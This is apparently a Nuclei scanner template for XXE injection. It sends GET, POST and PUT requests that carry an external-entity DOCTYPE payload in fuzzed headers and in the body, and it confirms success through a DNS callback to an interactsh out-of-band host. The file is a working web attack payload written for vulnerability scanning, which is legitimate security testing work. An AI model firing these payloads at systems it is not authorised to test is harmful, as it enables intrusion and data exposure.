id: XXE_injection
info:
  author: MR.iambatman
  description: XXE
  name: XXE-injection
  severity: high
requests:
- attack: clusterbomb
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  payloads:
    header: helpers/payloads/request-headers.txt
  raw:
  - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64;\
    \ rv:78.0) Gecko/20100101 Firefox/78.0\n\xA7header\xA7: < ! DOCTYPE foo [<!ENTITY\
    \ % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] > \nConnection: close\n< ! DOCTYPE\
    \ foo [<!ENTITY % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] >\n"
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64;\
    \ rv:78.0) Gecko/20100101 Firefox/78.0\n\xA7header\xA7: < ! DOCTYPE foo [<!ENTITY\
    \ % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] >\nConnection: close\nContent-Type:\
    \ application/x-www-form-urlencoded\n< ! DOCTYPE foo [<!ENTITY % xxe SYSTEM \"\
    {{interactsh-url}}\"> %xxe; ] >\n"
  - "PUT / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64;\
    \ rv:78.0) Gecko/20100101 Firefox/78.0\n\xA7header\xA7: < ! DOCTYPE foo [<!ENTITY\
    \ % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] >\nConnection: close\nContent-Type:\
    \ application/x-www-form-urlencoded\n< ! DOCTYPE foo [<!ENTITY % xxe SYSTEM \"\
    {{interactsh-url}}\"> %xxe; ] >\n"
  redirects: true
